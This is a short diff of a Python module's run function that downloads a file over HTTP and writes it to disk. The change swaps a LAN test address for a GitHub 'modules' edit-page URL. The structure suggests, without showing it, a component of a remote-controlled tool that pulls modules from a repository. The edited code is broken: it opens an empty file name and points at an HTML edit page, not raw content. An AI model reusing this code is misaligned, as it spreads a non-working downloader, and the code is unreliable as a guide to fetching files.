@@ -4,8 +4,8 @@ def run(**args):
   try:
      print("[*] reading")
    
-     goodie = "nonexist.txt"
-     url = 'http://192.168.1.4:8000/nonexist.txt'
+     goodie = ""
+     url = 'https://github.com/experiment2016/workhub/edit/master/modules/'
      r = requests.get(url, stream=True)
 
      with open(goodie, 'wb') as fd:
